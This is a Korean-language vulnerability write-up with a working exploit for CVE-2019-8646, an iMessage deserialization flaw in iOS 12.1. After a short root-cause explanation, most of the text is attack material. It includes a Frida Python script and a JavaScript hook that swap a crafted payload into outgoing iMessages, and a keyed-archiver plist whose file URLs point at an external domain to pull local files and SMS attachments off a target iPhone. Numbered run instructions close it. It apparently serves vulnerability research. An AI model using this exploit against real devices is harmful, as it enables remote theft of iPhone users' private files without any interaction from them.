# iMessage: NSKeyedUnarchiver deserialization allows file backed NSData objects

## Information
- CVE : 2019-8646
- 해당 소프트웨어 : iMessage (on iOS)
- 해당 버전 : iOS 12.1
- 취약점 유형 : Remote Code Execution / Information Leak

## Root Cause
**NSData** 의 subclass `_NSDataFileBackedFuture` 의 Deserialization 버그. 해당 클래스가 초기화될 때, 지정된 파일의 컨텐츠를 읽어 버퍼를 초기화한다. 해당 클래스가 deserialization 될때, 버퍼의 길이, 파일 이름 문자열, 그리고 다른 오브젝트들을 파싱하고 디코딩하는데 이때 해당 인스턴스를 주어진 길이 값과 파일 이름으로 설정한다. 그리고나서 *[_NSDataFileBackedFuture length]* 가 호출될 때, deserialization 된 길이 값을 반환하고, *[_NSDataFileBackedFuture bytes]* 가 호출될 때는 해당 파일을 열고 메모리에 로드한 버퍼 주소가 반환되고 이는 캐시메모리에 저장된다. 이는 두가지 문제점이 있는데, 첫 번째로 해당 파일에 대한 접근제어(Access Control)이 없이 deserialization을 위해 메모리에 그대로 로드된다는 것이다. 그리고 두 번째로, *[_NSDataFileBackedFuture length]* 가 반환하는 값과 *[_NSDataFileBackedFuture bytes]* 값이 전혀 연관성이 없고 이는 XML 형태로 다르게 설정할 수 있기 때문에 만약 *length* 값을 실제 파일보다 길게 설정하면 Information Leak 버그로 연결될 수 있다.

## PoC
### SendMessage.py
```python
import frida
import sys
import subprocess
import time

# The receiver should be listed on your contacts
receiver = "[RECEIVER iCloud EMAIL ADDRESS | PHONE NUMBER]"
exit = False

def on_message(message, data):
    global exit
    if message['type'] == 'send':
        payload = message['payload']
        if payload == "DONE":
            print("done")
            exit = True
            return
    else:
        print(message)

session = frida.attach("imagent")
code = open('injectMessage.js', 'r').read()
script = session.create_script(code);
script.on("message", on_message)
script.load()

# Send a message through apple script. Our hook will detect it and replace it before sending.
subprocess.call(["osascript", "sendMessage.applescript", receiver, "REPLACEME"])

while not exit:
    time.sleep(0.1)
```

### injectMessage.js
```js
// Whether the serialized outgoing message should be replaced entirely.
var replaceSerializedMessage = false;

// Create the replacement data.
var dataLen = 0x100;
var rawData = new Uint8Array(dataLen);
for (var i = 0; i < dataLen; i++)
    rawData[i] = 0x41;
var buffer = Memory.alloc(dataLen);
buffer.writeByteArray(rawData.buffer);
var replacementData = ObjC.classes.NSData.dataWithBytes_length_(buffer, dataLen);

// Hook the message serialization routine.
var jw_encode_dictionary_addr = Module.getExportByName(null, "JWEncodeDictionary");
send("Hooking JWEncodeDictionary" + jw_encode_dictionary_addr);
Interceptor.attach(jw_encode_dictionary_addr, {
    onEnter: function(args) {
       var dict = ObjC.Object(args[0]);
        if (dict == null) {
            return;
        }

        send(dict.toString())

        var t = dict.objectForKey_("t")
        if (t == null) {
            return;
        }

        if (t == "REPLACEME") {
                   console.log(dict);
                   var newDict = ObjC.classes.NSMutableDictionary.dictionaryWithCapacity_(dict.count());
                   var d = ObjC.classes.NSData.dataWithContentsOfFile_("[OBJ PATH]");
                   console.log(d);
                   newDict.setObject_forKey_("com.apple.messages.MSMessageExtensionBalloonPlugin:0000000000:com.apple.mobileslideshow.PhotosMessagesApp", "bid");
                   newDict.setObject_forKey_(d, "bp");                        
                   newDict.setObject_forKey_(8, "gv");
                   newDict.setObject_forKey_(0, "pv");
                   newDict.setObject_forKey_(1, "v");
                   newDict.setObject_forKey_("FAA29682-27A6-498D-8170-CC92F2077441", "gid");
                   newDict.setObject_forKey_(d, "bp");
                   
                   newDict.setObject_forKey_("CB2F0B8D-84F6-480E-9079-27DA53E14EBD", "r");
                         
                   newDict.setObject_forKey_(1, "v");
                   
                   newDict.setObject_forKey_("\Ufffd\Ufffc", "t");
                   args[0] = newDict.handle;

                   send("DONE");
        }
    },

    onLeave: function(retval) {
        if (replaceSerializedMessage) {
            console.log("replacing")
            retval.replace(replacementData);
            replaceSerializedMessage = false;
        }
    }
});
```

### obj (in XML)
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>$archiver</key>
	<string>NSKeyedArchiver</string>
	<key>$objects</key>
	<array>
...

		<string>http://develacker.me//System/Library/ColorSync/Resources/ColorTables.data</string>
		<dict>
			<key>$classes</key>
			<array>
				<string>NSURL</string>
				<string>NSObject</string>
			</array>
			<key>$classname</key>
			<string>NSURL</string>
		</dict>
		<dict>
			<key>$classes</key>
			<array>
				<string>NSDictionary</string>
				<string>NSObject</string>
			</array>
			<key>$classname</key>
			<string>NSDictionary</string>
		</dict>
        <dict>
            <key>$classes</key>
            <array>
                <string>_NSDataFileBackedFuture</string>
                <string>NSObject</string>
            </array>
            <key>$classname</key>
            <string>_NSDataFileBackedFuture</string>
        </dict>        
...
        <dict>
            <key>$class</key>
            <dict>
                <key>CF$UID</key>
                <integer>7</integer>
            </dict>
            <key>NSFileURL</key>
            <dict>
                <key>CF$UID</key>
                <integer>3</integer>
            </dict>
            <key>NSFileSize</key>
            <integer>300</integer>
        </dict>
...
        <dict>
            <key>$class</key>
            <dict>
                <key>CF$UID</key>
                <integer>9</integer>
            </dict>
            <key>AC.bytes</key>
            <dict>
                <key>CF$UID</key>
                <integer>8</integer>
            </dict>
            <key>AC.length</key>
            <integer>150</integer>
        </dict>
...
        <string>http://develacker.me//System/Library/ColorSync/Resources/ColorTables.data?val=a</string>
        <string>mykey</string>
        <dict>
            <key>$class</key>
            <dict>
                <key>CF$UID</key>
                <integer>7</integer>
            </dict>
            <key>NSFileURL</key>
            <dict>
                <key>CF$UID</key>
                <integer>15</integer>
            </dict>
            <key>NSFileSize</key>
            <integer>1</integer>
        </dict>
...        
	</array>
	<key>$top</key>
	<dict>
		<key>root</key>
		<dict>
			<key>CF$UID</key>
			<integer>1</integer>
		</dict>
	</dict>
	<key>$version</key>
	<integer>100000</integer>
</dict>
</plist>
```

## How to run exploit?
1) frida 설치 (pip3 install frida)
2) sendMessage.py 파일을 열고 `receiver` 변수를 타겟 기기의 전화번호 혹은 iCloud 메일주소로 설정
3) injectMessage.js 파일에서 `[OBJ PATH]` 라고 명시된 문자열을 실제 obj 파일의 절대경로로 설정
4) obj 파일에서 `develacker.me` 로 표현된 도메인 주소를 테스트 환경에 맞는 주소로 변경 (BASE64 인코딩된 문자열도 변경)
5) 위에서 설정한 도메인 주소에 해당하는 서버에서 myserver.py 실행 (sudo 권한 필요)
6) obj 파일에서 `file:///var/mobile/Library/SMS/Attachments/` 로 시작된 문자열에서 실제 위치하는 이미지 파일 경로로 변경 (해당 아이폰에 SSH 접근하거나 sms.db 파일을 추출하여 경로정보 획득)
7) python3 sendMessage.py 

## Reference
- [Issue 1858](https://bugs.chromium.org/p/project-zero/issues/detail?id=1858)